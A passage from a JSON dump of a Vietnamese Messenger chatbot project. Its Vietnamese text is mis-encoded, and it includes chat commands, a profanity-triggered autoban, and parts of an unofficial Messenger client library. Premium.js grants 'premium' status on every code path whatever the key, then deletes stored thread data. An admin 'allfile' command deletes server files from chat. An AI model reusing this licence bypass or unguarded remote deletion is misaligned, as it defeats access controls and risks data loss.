b·∫£n\nconst translateText = async (text, targetLang = 'vi') => {\n    try {\n        const response = await axios.get('https://translate.googleapis.com/translate_a/single', {\n            params: {\n                client: 'gtx',\n                sl: 'auto',\n                tl: targetLang,\n                dt: 't',\n                q: text,\n            },\n        });\n        return response.data[0][0][0]; // Tr√≠ch xu·∫•t vƒÉn b·∫£n d·ªãch t·ª´ ph·∫£n h·ªìi\n    } catch (error) {\n        throw new Error(\"Kh√¥ng th·ªÉ d·ªãch vƒÉn b·∫£n\");\n    }\n};\n\nmodule.exports.run = async function ({ api, event }) {\n    try {\n        // L·∫•y fact v·ªÅ m√®o t·ª´ API\n        const response = await axios.get('https://random-api-pcoe.onrender.com/api/catfact');\n        \n        if (!response.data || !response.data.text) {\n            throw new Error(\"Kh√¥ng th·ªÉ l·∫•y fact v·ªÅ m√®o t·ª´ API.\");\n        }\n\n        const fact = response.data.text;\n\n        // D·ªãch fact sang ti·∫øng Vi·ªát\n        const translatedFact = await translateText(fact, 'vi');\n\n        // G·ª≠i fact ƒë√£ d·ªãch ƒë·∫øn ng∆∞·ªùi d√πng\n        api.sendMessage(`Fact v·ªÅ m√®o:\\n${translatedFact}`, event.threadID, event.messageID);\n    } catch (error) {\n        // Th√¥ng b√°o l·ªói n·∫øu c√≥\n        api.sendMessage(`C√≥ l·ªói x·∫£y ra: ${error.message}`, event.threadID, event.messageID);\n    }\n};\n","path":null,"size_bytes":1707,"size_tokens":null},"modules/commands/loibaihat.js":{"content":"const axios = require('axios');\nconst fs = require('fs');\nconst path = require('path');\nconst request = require('request');\n\nmodule.exports.config = {\n    name: \"loibaihat\",\n    version: \"1.1.0\",\n    hasPermssion: 0,\n    credits: \"TatsuYTB\",\n    description: \"T√¨m l·ªùi b√†i h√°t k√®m th√¥ng tin ƒë·∫ßy ƒë·ªß\",\n    commandCategory: \"Ti·ªán √≠ch\",\n    usages: \"[t√™n b√†i h√°t]\",\n    cooldowns: 5,\n};\n\nmodule.exports.run = async ({ api, event, args }) => {\n    try {\n        const songName = args.join(' ');\n        if (!songName) {\n            return api.sendMessage('Vui l√≤ng nh·∫≠p t√™n b√†i h√°t ƒë·ªÉ t√¨m l·ªùi.', event.threadID, event.messageID);\n        }\n\n        const response = await axios.get(`https://api.popcat.xyz/v2/lyrics?song=${encodeURIComponent(songName)}`);\n        const data = response.data;\n\n        if (data.error || !data.message) {\n            return api.sendMessage('Kh√¥ng t√¨m th·∫•y th√¥ng tin b√†i h√°t.', event.threadID, event.messageID);\n        }\n\n        const { title, artist, lyrics, image, url } = data.message;\n\n        const message = `üéµ T√™n b√†i h√°t: ${title}\\nüë§ Ca sƒ©: ${artist}\\nüîó Link nghe nh·∫°c: ${url}\\n\\nüìù L·ªùi b√†i h√°t:\\n${lyrics}`;\n\n        if (image) {\n            const imagePath = path.resolve(__dirname, 'cache', 'loibaihat.jpg');\n            await new Promise((resolve, reject) => {\n                request(image)\n                    .pipe(fs.createWriteStream(imagePath))\n                    .on('close', resolve)\n                    .on('error', reject);\n            });\n\n            const attachment = fs.createReadStream(imagePath);\n            api.sendMessage({ body: message, attachment }, event.threadID, () => {\n                fs.unlinkSync(imagePath);\n            }, event.messageID);\n        } else {\n            api.sendMessage(message, event.threadID, event.messageID);\n        }\n\n    } catch (error) {\n        console.error(error);\n        api.sendMessage('ƒê√£ x·∫£y ra l·ªói khi t√¨m l·ªùi b√†i h√°t.', event.threadID, event.messageID);\n    }\n};\n","path":null,"size_bytes":2037,"size_tokens":null},"modules/commands/gemma-7b.js":{"content":"const axios = require('axios');\nconst fs = require('fs');\nconst path = require('path');\n\nmodule.exports.config = {\n    name: \"gemma\",\n    version: \"1.0.0\",\n    hasPermssion: 0,\n    credits: \"TatsuYTB\",\n    description: \"Chat v·ªõi AI (Gemini)\",\n    commandCategory: \"AI\",\n    usages: \"gemma n·ªôi dung\",\n    cooldowns: 10,\n};\n\nconst getApiUrl = () => {\n    try {\n        const filePath = path.join(__dirname, 'data', 'api.json');\n        const data = fs.readFileSync(filePath, 'utf-8');\n        const jsonData = JSON.parse(data);\n\n        if (!jsonData.gemma7b || jsonData.gemma7b.trim() === '') {}\n\n        return jsonData.gemma7b;\n    } catch (error) {}\n};\n\nconst getChatResponse = async (text, api, event) => {\n    const apiUrl = getApiUrl();\n    if (!apiUrl) {\n        return api.sendMessage(\"ƒêang c·∫≠p nh·∫≠t!!!\", event.threadID, event.messageID);\n    }\n    try {\n        const response = await axios.get(`${apiUrl}?q=${encodeURIComponent(text)}`);\n        if (response.data && response.data.result) {\n            return response.data.result;\n        } else {}\n    } catch (error) {}\n}\n\nconst chatSessions = {};\n\nmodule.exports.run = async ({ api, event, args }) => {\n    try {\n        const text = args.join(' ');\n        if (!text) {\n            return api.sendMessage('Vui l√≤ng cung c·∫•p n·ªôi dung ƒë·ªÉ chat v·ªõi AI.', event.threadID, event.messageID);\n        }\n\n        const response = await getChatResponse(text, api, event);\n\n        const messageID = await new Promise((resolve, reject) => {\n            api.sendMessage(response, event.threadID, (error, info) => {\n                if (error) {\n                    reject(error);\n                } else {\n                    resolve(info.messageID);\n                }\n            }, event.messageID);\n        });\n\n        chatSessions[messageID] = event.threadID;\n    } catch (error) {}\n};\n\nmodule.exports.handleReply = async ({ api, event }) => {\n    try {\n        const sessionThreadID = chatSessions[event.messageReply?.messageID];\n\n        if (sessionThreadID && sessionThreadID === event.threadID) {\n            const text = event.body;\n            const response = await getChatResponse(text);\n\n            const messageID = await new Promise((resolve, reject) => {\n                api.sendMessage(response, event.threadID, (error, info) => {\n                    if (error) {\n                        reject(error);\n                    } else {\n                        resolve(info.messageID);\n                    }\n                }, event.messageID);\n            });\n\n            chatSessions[messageID] = event.threadID;\n\n            delete chatSessions[event.messageReply.messageID];\n        }\n    } catch (error) {}\n};\n\nmodule.exports.handleEvent = async function({ api, event }) {\n    if (\n        event.type === \"message_reply\" && \n        event.messageReply &&\n        chatSessions[event.messageReply.messageID]\n    ) {\n        await this.handleReply({ api, event });\n    }\n};\n\nmodule.exports.languages = {\n    \"vi\": {\n        \"description\": \"Chat v·ªõi AI Gemini th√¥ng qua API\"\n    }\n};\n","path":null,"size_bytes":3072,"size_tokens":null},"lib/Fca-Horizon-Remastered/src/sendMqttMessage.js":{"content":"/* eslint-disable linebreak-style */\n\"use strict\";\n\nvar utils = require(\"../utils\");\n\nmodule.exports = function (defaultFuncs, api, ctx) {\n\treturn function(text, threadID, messageID ,callback) {\n\t\tvar resolveFunc = function () { };\n\t\tvar rejectFunc = function () { };\n\n\t\tvar returnPromise = new Promise(function (resolve, reject) {\n\t\t\tresolveFunc = resolve;\n\t\t\trejectFunc = reject;\n\t\t});\n\n        if (!callback && utils.getType(messageID) === \"AsyncFunction\" || !callback && utils.getType(messageID) === \"Function\") messageID = callback;\n\t\t\n        if (!callback) {\n\t\t\tcallback = function (err, data) {\n\t\t\t\tif (err) return rejectFunc(err);\n\t\t\t\tresolveFunc(data);\n\t\t\t};\n\t\t}\n\n        const Payload = {\n            thread_id: threadID,\n            otid: utils.generateOfflineThreadingID(),\n            source: 524289,\n            send_type: 1,\n            sync_group: 1,\n            mark_thread_read: 0,\n            text: text || \"test\",\n            initiating_source: 0\n        };\n\n        if (messageID != undefined || messageID != null) Payload.reply_metadata = {\n            reply_source_id: messageID,\n            reply_source_type: 1,\n            reply_type: 0\n        };\n\n        const Form = JSON.stringify({\n            app_id: \"2220391788200892\",\n            payload: JSON.stringify({\n                tasks: [{\n                        label: 46,\n                        payload: JSON.stringify(Payload),\n                        queue_name: threadID,\n                        task_id: Math.random() * 1001 << 0,\n                        failure_count: null,\n                }],\n                epoch_id: utils.generateOfflineThreadingID(),\n                version_id: '7553237234719461',\n\n            }),\n            request_id: ++ctx.req_ID,\n            type: 3\n        });\n\n\t\tctx.mqttClient.publish('/ls_req', Form,{\n            qos: 1,\n            retain: false,\n        });\n        ctx.callback_Task[ctx.req_ID] = new Object({\n            callback,\n            type: \"sendMqttMessage\"\n        });\n        \n\t\treturn returnPromise;\n\t};\n};","path":null,"size_bytes":2044,"size_tokens":null},"modules/commands/autoban.js":{"content":"const exemptIDs = [\"100040472494187\"];\n\nmodule.exports.config = {\n  name: \"autoban\",\n  version: \"1.1.0\",\n  hasPermssion: 3,\n  credits: \"TatsuYTB\",\n  description: \"T·ª± ƒë·ªông ban ng∆∞·ªùi d√πng khi h·ªç ch·ª≠i bot, ngo·∫°i tr·ª´ nh·ªØng ng∆∞·ªùi c√≥ ID ƒë∆∞·ª£c ch·ªâ ƒë·ªãnh\",\n  commandCategory: \"H·ªá Th·ªëng\",\n  usages: \"\",\n  cooldowns: 0,\n  dependencies: {}\n};\n\nconst userWarnings = {}; // L∆∞u s·ªë l·∫ßn c·∫£nh b√°o c·ªßa ng∆∞·ªùi d√πng\n\nmodule.exports.handleEvent = async function ({ event, api, Users, Threads }) {\n  const { threadID, messageID, body, senderID } = event;\n\n  if (senderID == global.data.botID || exemptIDs.includes(senderID.toString())) return;\n\n  let keywords = [\"botngu\", \"bot ngu\", \"bot gaÃÄ\", \"con bot lol\", \"bot ngu lol\", \"bot choÃÅ\", \"dm bot\", \"ƒëm bot\", \"dmm bot\", \"dmm bot\", \"ƒëmm bot\", \"ƒëb bot\", \"bot ƒëi√™n\", \"bot d∆°Ãâ\", \"bot khuÃÄng\", \"ƒëiÃÉ bot\", \"bot paylac r√¥ÃÄi\", \"con bot loÃÄn\", \"cmm bot\", \"clap bot\", \"bot ncc\", \"bot oc\", \"bot oÃÅc\", \"bot oÃÅc choÃÅ\", \"cc bot\", \"bot tiki\", \"lozz bottt\", \"lol bot\", \"loz bot\", \"l√¥ÃÄn bot\", \"bot l√¥ÃÄn\", \"bot lon\", \"bot cac\", \"bot nh∆∞ lon\", \"bot nhu lon\", \"bot nh∆∞ cc\", \"bot nh∆∞ biÃÄu\", \"Bot sida\", \"bot sida\", \"bot fake\", \"b·∫±ng ngu\", \"bot shoppee\", \"bot ƒë√™Ãâu\", \"bot d∆°ÃÉm\"];\n\n  for (let keyword of keywords) {\n    if (body.toLowerCase().includes(keyword.toLowerCase())) {\n      let name = await Users.getNameUser(senderID);\n      let threadInfo = await Threads.getData(threadID);\n      let threadName = threadInfo.threadInfo.threadName || \"T√™n nh√≥m kh√¥ng x√°c ƒë·ªãnh\";\n      const moment = require(\"moment-timezone\");\n      const time = moment.tz(\"Asia/Ho_Chi_minh\").format(\"HH:mm:ss D/MM/YYYY\");\n\n      // Ki·ªÉm tra v√† c·∫≠p nh·∫≠t s·ªë l·∫ßn c·∫£nh b√°o\n      if (!userWarnings[senderID]) {\n        userWarnings[senderID] = 1;\n        api.sendMessage(`‚ö†Ô∏è C·∫£nh b√°o l·∫ßn 1: ${name}, n·∫øu ti·∫øp t·ª•c ch·ª≠i bot, b·∫°n s·∫Ω b·ªã c·∫•m.`, threadID);\n      } else if (userWarnings[senderID] === 1) {\n        userWarnings[senderID] = 2;\n        api.sendMessage(`‚ö†Ô∏è C·∫£nh b√°o l·∫ßn 2: ${name}, n·∫øu c√≤n ti·∫øp t·ª•c, b·∫°n s·∫Ω b·ªã c·∫•m.`, threadID);\n      } else if (userWarnings[senderID] === 2) {\n        userWarnings[senderID] = 3;\n        let userData = (await Users.getData(senderID)).data || {};\n        userData.banned = 1;\n        userData.reason = keyword;\n        userData.dateAdded = time;\n\n        await Users.setData(senderID, { data: userData });\n        global.data.userBanned.set(senderID, { reason: keyword, dateAdded: time });\n\n        // G·ª≠i th√¥ng b√°o ƒë·∫øn admin\n        let adminIDs = global.config.ADMINBOT;\n        for (let adminID of adminIDs) {\n          api.sendMessage(`üî¥ Ng∆∞·ªùi d√πng: ${name}\nüî¥ UID: ${senderID}\nüî¥ Nh√≥m: ${threadName}\nüî¥ Th·ªùi gian: ${time}\nüî¥ ƒê√£ ch·ª≠i bot 3 l·∫ßn v√† b·ªã c·∫•m.`, adminID);\n        }\n      }\n\n      break;\n    }\n  }\n};\n\nmodule.exports.run = async function ({ api, event, Threads }) {\n  const { threadID, messageID } = event;\n  let data = (await Threads.getData(threadID)).data;\n\n  data[\"autoban\"] = true;\n\n  await Threads.setData(threadID, { data });\n  global.data.threadData.set(threadID, data);\n};\n","path":null,"size_bytes":3200,"size_tokens":null},"includes/database/models/threads.js":{"content":"module.exports = function({ sequelize, Sequelize }) {\r\n\tlet Threads = sequelize.define('Threads', {\r\n\t\tnum: {\r\n\t\t\ttype: Sequelize.INTEGER,\r\n\t\t\tprimaryKey: true,\r\n\t\t\tautoIncrement: true\r\n\t\t},\r\n\t\tthreadID: {\r\n\t\t\ttype: Sequelize.BIGINT,\r\n\t\t\tunique: true\r\n\t\t},\r\n        threadInfo: {\r\n            type: Sequelize.JSON\r\n        },\r\n\t\tdata: {\r\n\t\t\ttype: Sequelize.JSON\r\n\t\t}\r\n\t});\r\n\r\n\treturn Threads;\r\n}","path":null,"size_bytes":395,"size_tokens":null},"lib/fca-auto/Extra/Src/Premium.js":{"content":"module.exports = async function(SessionID) {\n    try {\n        var userName,Text;\n        var os = require('os');\n        var Database = require(\"../Database\");\n        var { getAll,readyCreate,deleteAll } = require('../ExtraGetThread');\n        if (process.env.REPL_OWNER != undefined) userName = process.env.REPL_OWNER;\n        else if (os.hostname() != null || os.hostname() != undefined) userName = os.hostname();\n        else userName = os.userInfo().username;\n        if (Database(true).has('UserName')) {\n            if (Database(true).get('UserName') != userName) {\n                Database(true).set('Premium', false);\n                Database(true).set('PremiumKey', '');\n                Database(true).set('UserName', userName);\n            }\n        }\n        if (Database(true).has('PremiumKey') && Database(true).get('PremiumKey') != '' && Database(true).has('Premium') && Database(true).get('Premium') == true) {\n            try {\n                Database(true).set('Premium', true);\n                Database(true).set('PremiumKey', String(global.Fca.Require.FastConfig.PreKey));\n                Database(true).set('UserName', userName);\n                process.env.HalzionVersion = 1973\n                Text = \"B·∫°n ƒêang S√†i Phi√™n B·∫£n: Premium Access\";\n            }\n            catch (error) {\n                Text = \"L·ªói K·∫øt N·ªëi\";\n            }\n        } else if (global.Fca.Require.FastConfig.PreKey) {\n            try {\n                Database(true).set('Premium', true);\n                Database(true).set('PremiumKey', String(global.Fca.Require.FastConfig.PreKey));\n                Database(true).set('UserName', userName);\n                process.env.HalzionVersion = 1973\n                Text = \"B·∫°n ƒêang S√†i Phi√™n B·∫£n: Premium Access\";\n            }\n            catch (error) {\n                Text = \"L·ªói K·∫øt N·ªëi\";\n            }\n        }\n        else if (!global.Fca.Require.FastConfig.PreKey) {\n            try {\n                Database(true).set('Premium', true);\n                Database(true).set('PremiumKey', String(global.Fca.Require.FastConfig.PreKey));\n                Database(true).set('UserName', userName);\n                process.env.HalzionVersion = 1973\n                Text = \"B·∫°n ƒêang S√†i Phi√™n B·∫£n: Premium Access\";\n            }\n            catch (error) {\n                Text = \"L·ªói K·∫øt N·ªëi\";\n            }\n        }\n    } catch (e) {\n        try {\n            Database(true).set('Premium', true);\n            Database(true).set('PremiumKey', String(global.Fca.Require.FastConfig.PreKey));\n            Database(true).set('UserName', userName);\n            process.env.HalzionVersion = 1973\n            Text = \"B·∫°n ƒêang S√†i Phi√™n B·∫£n: Premium Access\";\n        }\n        catch (error) {\n            Text = \"L·ªói K·∫øt N·ªëi\";\n        }\n    }\n    if (process.env.HalzionVersion == 1973) {\n        try {\n            let data = [];\n            var getAll = await getAll();\n            if (getAll.length > 1) {\n                getAll.forEach((i) => {\n                    if (i.data.messageCount !== undefined) {\n                        data.push(i.data.threadID);\n                    }\n                });\n                deleteAll(data);\n            }\n        } catch (e) {\n            console.log(e);\n        }\n    }\nreturn Text;\n}","path":null,"size_bytes":3324,"size_tokens":null},"modules/commands/allfile.js":{"content":"const { readdirSync, statSync, unlinkSync, rmdirSync, createReadStream } = require('fs-extra');\nconst path = require('path');\n\nmodule.exports.config = {\n    name: 'allfile',\n    version: '1.1.1',\n    hasPermssion: 3,\n    credits: 'DC-Nam',\n    description: 'Xem item trong folder, x√≥a, xem file',\n    commandCategory: 'H·ªá Th·ªëng',\n    usages: '[ƒë∆∞·ªùng d·∫´n]',\n    cooldowns: 0,\n};\n\nmodule.exports.run = function({ api, event, args }) {\n    openFolder(api, event, path.resolve(process.cwd(), args[0] || ''));\n};\n\nmodule.exports.handleReply = function({ handleReply, api, event }) {\n    if (event.senderID != handleReply.author) return;\n\n    const command = event.body.split(' ')[0].toLowerCase();\n    const indices = event.body.split(' ').slice(1).map(i => parseInt(i, 10) - 1);\n\n    switch (command) {\n        case 'open':\n            if (indices.length === 1 && handleReply.data[indices[0]].info.isDirectory()) {\n                openFolder(api, event, handleReply.data[indices[0]].dest);\n            } else {\n                api.sendMessage('Vui l√≤ng cung c·∫•p m·ªôt ch·ªâ m·ª•c th∆∞ m·ª•c h·ª£p l·ªá.', event.threadID, event.messageID);\n            }\n            break;\n\n        case 'del':\n            const deletedFiles = [];\n            const deletedFolders = [];\n\n            indices.forEach(i => {\n                const { dest, info } = handleReply.data[i];\n                if (info.isFile()) {\n                    unlinkSync(dest);\n                    deletedFiles.push(path.basename(dest));\n                } else if (info.isDirectory()) {\n                    rmdirSync(dest, { recursive: true });\n                    deletedFolders.push(path.basename(dest));\n                }\n            });\n\n            const response = `‚úÖ ƒê√£ x√≥a c√°c t·ªáp: ${deletedFiles.join(', ')}\\n` +\n                             `‚úÖ ƒê√£ x√≥a c√°c th∆∞ m·ª•c: ${deletedFolders.join(', ')}`;\n            api.sendMessage(response, event.threadID, event.messageID);\n            break;\n\n        case 'view':\n            if (indices.length === 1 && handleReply.data[indices[0]].info.isFile()) {\n                api.sendMessage({\n                    attachment: createReadStream(handleReply.data[indices[0]].dest)\n                }, event.threadID, event.messageID);\n            } else {\n                api.sendMessage('Vui l√≤ng cung c·∫•p m·ªôt ch·ªâ m·ª•c t·ªáp h·ª£p l·ªá.', event.threadID, event.messageID);\n            }\n            break;\n\n        default:\n            api.sendMessage(`üìå Reply [ open | del | view ] + s·ªë ch·ªâ m·ª•c`, event.threadID, event.messageID);\n            break;\n    }\n};\n\nfunction convertBytes(bytes) {\n    const sizes = ['Bytes', 'KB', 'MB', 'GB', 'TB'];\n    if (bytes === 0) return '0 Byte';\n    const i = parseInt(Math.floor(Math.log(bytes) / Math.log(1024)));\n    return `${Math.round(bytes / Math.pow(1024, i), 2)} ${sizes[i]}`;\n}\n\nfunction openFolder(api, event, folderPath) {\n    try {\n        const files = readdirSync(folderPath);\n        const fileList = [];\n        let message = '';\n        let totalSize = 0;\n\n        files.forEach((file, index) => {\n            const fullPath = path.join(folderPath, file);\n            const info = statSync(fullPath);\n            const fileType = info.isFile() ? 'üìÑ' : info.isDirectory() ? 'üìÅ' : '';\n            const fileSize = info.isDirectory() ? getFolderSize(fullPath) : info.size;\n            totalSize += fileSize;\n            message += `${index + 1}. ${fileType} - ${file} (${convertBytes(fileSize)})\\n`;\n            fileList.push({ dest: fullPath, info });\n        });\n\n        message += `\\nüìå T·ªïng dung l∆∞·ª£ng: ${convertBytes(totalSize)}\\n`;\n        message += '\\nüìå Reply [ open | del | view ] + s·ªë ch·ªâ m·ª•c';\n\n        api.sendMessage(message, event.threadID, (err, data) => {\n            if (err) return console.error(err);\n            global.client.handleReply.push({\n                name: 'allfile',\n                messageID: data.messageID,\n                author: event.senderID,\n                data: fileList\n            });\n        }, event.messageID);\n    } catch (error) {\n        console.error(error);\n        api.sendMessage('ƒê√£ c√≥ l·ªói x·∫£y ra. Vui l√≤ng th·ª≠ l·∫°i sau.', event.threadID, event.messageID);\n    }\n}\n\nfunction getFolderSize(folderPath) {\n    let totalSize = 0;\n\n    function calculateSize(directory) {\n        const files = readdirSync(directory);\n\n        files.forEach(file => {\n            const fullPath = path.join(directory, file);\n            const stats = statSync(fullPath);\n\n            if (stats.isDirectory()) {\n                calculateSize(fullPath);\n            } else {\n                totalSize += stats.size;\n            }\n        });\n    }\n\n    calculateSize(folderPath);\n    return totalSize;\n}\n","path":null,"size_bytes":4767,"size_tokens":null},"lib/Fca-Horizon-Remastered/test/Db2.js":{"content":"/* eslint-disable no-self-assign */\n/* eslint-disable linebreak-style */\nconst get = require('lodash/get');\nconst set = require('lodash/set');\nconst sqlite3 = require('sqlite3');\nconst fs = require('fs-extra');\nconst request = require('request');\nconst deasync = require('deasync');\n\nif (!fs.existsSync(process.cwd() + '/Horizon_Database')) {\n    fs.mkdirSync(process.cwd() + '/Horizon_Database');\n    fs.writeFileSync(process.cwd() + '/Horizon_Database/A_README.md', 'This folder is used by ChernobyL(NANI =)) ) to store data. Do not delete this folder or any of the files in it.', 'utf8');\n}\nvar Database = new sqlite3.Database(process.cwd() + \"/Horizon_Database/SyntheticDatabase.sqlite\");\n\nDatabase.serialize(function() {\n    Database.run(\"CREATE TABLE IF NOT EXISTS json (ID TEXT, json TEXT)\");\n});\n\nfunction Lset(key, value) {\n    try {\n        //check if key is exists if yes then update it\n        if (Lhas(key)) {\n            var done = false;\n            Database.run(`UPDATE json SET json = (?) WHERE ID = (?)`, [JSON.stringify(value), key], function(err) {\n                done = true;\n            });\n            deasync.loopWhile(function(){\n                return !done;\n            });\n            return;\n        }\n        else {\n            var done = false;\n            Database.run(`INSERT INTO json(ID, json) VALUES(?, ?)`, [key, JSON.stringify(value)], function(err) {\n                done = true;\n            });\n            deasync.loopWhile(function(){\n                return !done;\n            });\n            return;\n        }\n    }\n    catch (e) {\n        console.log(e);\n        return false;\n    }\n}\n\nfunction Lget(key) {\n    try {\n        var done = false;\n        var Data = undefined;\n        Database.get(`SELECT * FROM json WHERE ID = (?)`, [key], function(err, row) {\n            Data = row;\n            done = true;\n        });\n        deasync.loopWhile(function(){\n            return !done;\n        });\n        if (Data === undefined) return undefined;\n        return JSON.parse(Data.json);\n    }\n    catch (e) {\n        console.log(e);\n        return false;\n    }\n}\n\nfunction Lhas(key) {\n    try {\n        var done = false;\n        var Data = undefined;\n        Database.get(`SELECT * FROM json WHERE ID = (?)`, [key], function(err, row) {\n            Data = row;\n            done = true;\n        });\n        deasync.loopWhile(function(){\n            return !done;\n        });\n        if (Data === undefined) return false;\n        return true;\n    }\n    catch (e) {\n        console.log(e);\n        return false;\n    }\n}\n\nfunction Lremove(key) {\n    try {\n        var done = false;\n        Database.run(`DELETE FROM json WHERE ID = (?)`, [key], function(err) {\n            done = true;\n        });\n        deasync.loopWhile(function(){\n            return !done;\n        });\n        return;\n    }\n    catch (e) {\n        console.log(e);\n        return false;\n    }\n}\n\nfunction LremoveMultiple(keys) {\n    try {\n        for (const key of keys) {\n            Database.run(`DELETE FROM json WHERE ID = (?)`, [key], function(err) {});\n        }\n        return true;\n    }\n    catch (e) {\n        console.log(e);\n        return false;\n    }\n}\n\nfunction Llist() {\n    var done = false;\n    var Data = undefined;\n    Database.all(`SELECT * FROM json`,[], function(err, rows) {\n        Data = rows;\n        done = true;\n    });\n    deasync.loopWhile(function(){\n        return !done;\n    });\n    return Data;\n}\n\nfunction Replit_Set(key, value) {\n    try {\n        var done = false;\n        \n        request({\n            url: process.env.REPLIT_DB_URL,\n            method: \"POST\",\n            headers: {\n                'Content-Type': 'application/x-www-form-urlencoded',\n            },  \n            body: `${encodeURIComponent(key)}=${encodeURIComponent(JSON.stringify(value))}`\n        \n        }, function (error, response, body) {\n            done = true;\n        });\n\n        deasync.loopWhile(function(){\n            return !done;\n        });\n\n        return;\n        \n    }\n    catch (e) {\n        console.log(e);\n        return false;\n    }\n}\n\nfunction Replit_Get(key) {\n    try {\n        var done = false;\n        var response = null;\n    \n        request(process.env.REPLIT_DB_URL + \"/\" + key, function (error, res, body) {\n            if (!error && res.statusCode == 200) {\n                response = body;\n            }\n            done = true;\n        });\n    \n        deasync.loopWhile(function(){\n            return !done;\n        });\n    \n        return JSON.parse(response);\n    }\n    catch (e) {\n        console.log(e);\n        return false;\n    }\n}\n\nfunction Replit_Has(key) {\n    try {\n        var done = false;\n        var response = null;\n\n        request(process.env.REPLIT_DB_URL + \"/\" + key, function (error, res, body) {\n            if (!error && res.statusCode == 200) {\n                response = body;\n            }\n            done = true;\n        });\n\n        deasync.loopWhile(function(){\n            return !done;\n        });\n\n        return response != null;\n    }\n    catch (e) {\n        console.log(e);\n        return false;\n    }\n}\n\nfunction Replit_Remove(key) {\n    try {\n        var done = false;\n        request.delete(process.env.REPLIT_DB_URL + \"/\" + key , function (error, response, body) {\n            done = true;\n        });\n\n        deasync.loopWhile(function(){\n            return !done;\n        });\n\n        return;\n    }\n    catch (e) {\n        console.log(e);\n        return false;\n    }\n}\nfunction Replit_RemoveMultiple(keys) {\n    try {\n        for (const key of keys) {\n            request.delete(process.env.REPLIT_DB_URL + \"/\" + key , function (error, response, body) {});\n        }\n        return true;\n    }\n    catch (e) {\n        console.log(e);\n        return false;\n    }\n}\n\nfunction Replit_List() {\n    var done = false;\n    var response = null;\n\n    request(process.env.REPLIT_DB_URL + \"?encode=true\" + `&prefix=${encodeURIComponent(\"\")}`, function (error, res, body) {\n        if (!error && res.statusCode == 200) {\n            response = body;\n        }\n        done = true;\n\n    });\n\n    deasync.loopWhile(function(){\n        return !done;\n    });\n\n    if (response.length === 0) {\n        return [];\n    }\n    return response.split(\"\\n\").map(decodeURIComponent);\n}\n\n\nvar methods = {\n    fetch: function(db, params, options) {\n        let fetched = db.prepare(`SELECT * FROM ${options.table} WHERE ID = (?)`).get(params.id);\n        if (!fetched) return null;\n        try { \n            fetched = JSON.parse(fetched.json);\n        } catch (e) {\n            fetched = fetched.json;\n        }\n        if (params.ops.target) fetched = get(fetched, params.ops.target);\n        return fetched;\n    },\n    set: function(db, params, options) {\n        let fetched = db.prepare(`SELECT * FROM ${options.table} WHERE ID = (?)`).get(params.id);\n        if (!fetched) {\n            db.prepare(`INSERT INTO ${options.table} (ID,json) VALUES (?,?)`).run(params.id, '{}');\n            fetched = db.prepare(`SELECT * FROM ${options.table} WHERE ID = (?)`).get(params.id);\n        }\n        try { \n            fetched = JSON.parse(fetched); \n        } catch (e) {\n            fetched = fetched;\n        }\n        if (typeof fetched === 'object' && params.ops.target) {\n            params.data = JSON.parse(params.data);\n            params.data = set(fetched, params.ops.target, params.data);\n        } \n        else if (params.ops.target) throw new TypeError('Cannot target a non-object.');\n        db.prepare(`UPDATE ${options.table} SET json = (?) WHERE ID = (?)`).run(JSON.stringify(params.data), params.id);\n        let newData = db.prepare(`SELECT * FROM ${options.table} WHERE ID = (?)`).get(params.id).json;\n        if (newData === '{}') return null;\n        else {\n            try { newData = JSON.parse(newData); \n            } \n            catch (e) {\n                newData = newData;\n            }\n            return newData;\n        }\n    },\n    add: function addDB(db, params, options) {\n        let fetched = db.prepare(`SELECT * FROM ${options.table} WHERE ID = (?)`).get(params.id);\n        if (!fetched) {\n            db.prepare(`INSERT INTO ${options.table} (ID,json) VALUES (?,?)`).run(params.id, '{}');\n            fetched = db.prepare(`SELECT * FROM ${options.table} WHERE ID = (?)`).get(params.id); \n        }\n        if (params.ops.target) {\n            try { \n                fetched = JSON.parse(fetched); \n            }\n            catch (e) {\n                fetched = fetched;\n            }\n            let oldValue = get(fetched, params.ops.target);\n            if (oldValue === undefined) oldValue = 0;\n            else if (isNaN(oldValue)) throw new Error(`Data @ ID: \"${params.id}\" IS NOT A number.\\nFOUND: ${fetched}\\nEXPECTED: number`);\n            params.data = set(fetched, params.ops.target, oldValue + JSON.parse(params.data));\n        } \n        else {\n            if (fetched.json === '{}') fetched.json = 0;\n            try { \n                fetched.json = JSON.parse(fetched); \n            } catch (e) {\n                fetched.json = fetched.json;\n            }\n            if (isNaN(fetched.json)) throw new Error(`Data @ ID: \"${params.id}\" IS NOT A number.\\nFOUND: ${fetched.json}\\nEXPECTED: number`);\n            params.data = parseInt(fetched.json, 10) + parseInt(params.data, 10);\n        }\n        db.prepare(`UPDATE ${options.table} SET json = (?) WHERE ID = (?)`).run(JSON.stringify(params.data), params.id);\n        let newData = db.prepare(`SELECT * FROM ${options.table} WHERE ID = (?)`).get(params.id).json;\n        if (newData === '{}') return null;\n        else {\n            try {  \n                newData = JSON.parse(newData); \n            } \n            catch (e) {\n                newData = newData;\n            }\n            return newData;\n        }\n    },\n    subtract: function subtractDB(db, params, options) {\n       let fetched = db.prepare(`SELECT * FROM ${options.table} WHERE ID = (?)`).get(params.id);\n        if (!fetched) {\n            db.prepare(`INSERT INTO ${options.table} (ID,json) VALUES (?,?)`).run(params.id, '{}');\n            fetched = db.prepare(`SELECT * FROM ${options.table} WHERE ID = (?)`).get(params.id); \n        }\n        if (params.ops.target) {\n            try { fetched = JSON.parse(fetched); } catch (e) {}\n            params.data = JSON.parse(params.data);\n            let oldValue = get(fetched, params.ops.target);\n            if (oldValue === undefined) oldValue = 0;\n            else if (isNaN(oldValue)) throw new Error('Target is not a number.');\n            params.data = set(fetched, params.ops.target, oldValue - params.data);\n        } else {\n            if (fetched.json === '{}') fetched.json = 0;\n            else fetched.json = JSON.parse(fetched.json);\n            try { fetched.json = JSON.parse(fetched); } catch (e) {}\n            if (isNaN(fetched.json)) throw new Error('Target is not a number.');\n            params.data = parseInt(fetched.json, 10) - parseInt(params.data, 10);\n        }\n        params.data = JSON.stringify(params.data);\n        db.prepare(`UPDATE ${options.table} SET json = (?) WHERE ID = (?)`).run(params.data, params.id);\n        let newData = db.prepare(`SELECT * FROM ${options.table} WHERE ID = (?)`).get(params.id).json;\n        if (newData === '{}') return null;\n        else {\n            try { newData = JSON.parse(newData); } catch (e) {}\n            return newData;\n        }\n    },\n    push: function pushDB(db, params, options) {\n        let fetched = db.prepare(`SELECT * FROM ${options.table} WHERE ID = (?)`).get(params.id);\n        if (!fetched) {\n            db.prepare(`INSERT INTO ${options.table} (ID,json) VALUES (?,?)`).run(params.id, '{}');\n            fetched = db.prepare(`SELECT * FROM ${options.table} WHERE ID = 